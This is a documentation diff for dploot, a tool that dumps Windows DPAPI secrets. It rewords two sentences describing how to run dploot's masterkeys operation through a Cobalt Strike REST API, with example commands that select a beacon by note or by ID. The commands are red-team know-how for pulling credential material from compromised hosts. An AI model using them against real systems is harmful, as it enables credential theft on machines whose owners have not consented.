@@ -205,12 +205,12 @@ The `--root` directory should contain `Windows` and `Users` subdirectories match
 
 If you have a Cobalt Strike deployment with the [REST API](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_starting-rest-server.htm), you can execute dploot operations through it:
 
-You can also select a beacon by note:
+By default, dploot will ask you to choose a beacon through a dropdown selection. You can also select a beacon by note:
 ```text
 $ dploot masterkeys --protocol cobaltstrike --rest-url https://127.0.0.1:50443 --cs-username admin --cs-password password --beacon-note "my-target"
 ```
 
-If multiple beacons match the note, then you will be asked to select one of them. Once a beacon is selected, dploot will give you the corresponding Beacon ID, that you will be able to use in dploot like so:
+If multiple beacons match the note, then you will be asked to select one of them. Once a beacon is selected, dploot will give you the corresponding Beacon ID, that you will be able to use like so:
 ```text
 $ dploot masterkeys --protocol cobaltstrike --rest-url https://127.0.0.1:50443 --cs-username admin --cs-password password --beacon-id 1021841234
 ```
